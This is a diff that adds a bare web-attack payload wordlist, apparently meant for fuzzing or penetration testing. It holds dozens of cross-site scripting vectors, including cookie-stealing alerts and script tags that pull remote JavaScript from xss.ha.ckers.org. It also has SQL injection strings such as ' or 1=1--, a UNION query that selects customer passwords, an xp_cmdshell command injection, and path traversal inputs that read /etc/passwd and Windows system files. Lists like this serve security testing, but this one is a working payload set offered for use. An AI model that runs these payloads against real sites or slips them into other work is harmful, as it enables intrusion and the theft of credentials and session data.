@@ -1,0 +1,107 @@
+><script>alert(document.cookie)</script>
+='><script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+<script>alert(vulnerable)</script>
+%3Cscript%3Ealert('XSS1')%3C/script%3E
+<script>alert('XSS2')</script>
+<img src="javascript:alert('XSS3')">
+%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
+%22%3cscript%3ealert(%22xss4%22)%3c/script%3e
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
+%3c/a%3e%3cscript%3ealert(%22xss5%22)%3c/script%3e
+%3c/title%3e%3cscript%3ealert(%22xss6%22)%3c/script%3e
+%3cscript%3ealert(%22xss7%22)%3c/script%3e/index.html
+%3f.jsp
+%3f.jsp
+<script>alert('Vulnerable');</script>
+<script>alert('Vulnerable')</script>
+?sql_debug=1
+a%5c.aspx
+a.jsp/<script>alert('Vulnerable')</script>
+a/
+a?<script>alert('Vulnerable')</script>
+"><script>alert('Vulnerable')</script>
+';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&&
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%3Cscript%3Ealert(document. domain);%3C/script%3E&
+%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=
+1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
+http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd
+..\..\..\..\..\..\..\..\windows\system.ini
+\..\..\..\..\..\..\..\..\windows\system.ini
+'';!--"<XSS8>=&{()}
+<IMG src="javascript:alert('XSS9');">
+<IMG src=javascript:alert('XSS10')>
+<IMG src=JaVaScRiPt:alert('XSS11')>
+<IMG src=JaVaScRiPt:alert("XSS12")>
+<IMG src=javascript:alert('XSS13')>
+<IMG src=javascript:alert('XSS14')>
+<IMG src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG src="jav ascript:alert('XSS15');">
+<IMG src="jav ascript:alert('XSS16');">
+<IMG src="jav ascript:alert('XSS17');">
+"<IMG src=java\0script:alert(\"XSS18\")>";' > out
+<IMG src=" javascript:alert('XSS19');">
+<SCRIPT>a=/XSS20/alert(a.source)</SCRIPT>
+<BODY BACKGROUND="javascript:alert('XSS21')">
+<BODY ONLOAD=alert('XSS22')>
+<IMG DYNSRC="javascript:alert('XSS23')">
+<IMG LOWSRC="javascript:alert('XSS24')">
+<BGSOUND src="javascript:alert('XSS25');">
+<br size="&{alert('XSS26')}">
+<LAYER src="http://xss.ha.ckers.org/a.js"></layer>
+<LINK REL="stylesheet" href="javascript:alert('XSS27');">
+<IMG src='vbscript:msgbox("XSS28")'>
+<IMG src="mocha:[code]">
+<IMG src="livescript:[code]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS29');">
+<IFRAME src=javascript:alert('XSS30')></IFRAME>
+<FRAMESET><FRAME src=javascript:alert('XSS31')></FRAME></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS32')">
+<DIV STYLE="background-image: url(javascript:alert('XSS33'))">
+<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">
+<DIV STYLE="width: expression(alert('XSS34'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS35")';</STYLE>
+<IMG STYLE='xss:expre\ssion(alert("XSS36"))'>
+<STYLE TYPE="text/javascript">alert('XSS37');</STYLE>
+<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS38')");}</STYLE><A class="XSS"></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS39')")}</STYLE>
+<BASE href="javascript:alert('XSS40');//">
+getURL("javascript:alert('XSS41')")
+a="get";b="URL";c="javascript:";d="alert('XSS42');";eval(a+b+c+d);
+<XML src="javascript:alert('XSS43');">
+"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS44');}</SCRIPT><"
+<SCRIPT src="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
+<IMG src="javascript:alert('XSS45')"
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->
+<IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<SCRIPT a=">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<SCRIPT =">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<SCRIPT "a='>'" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>
+admin'--
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a[/code]
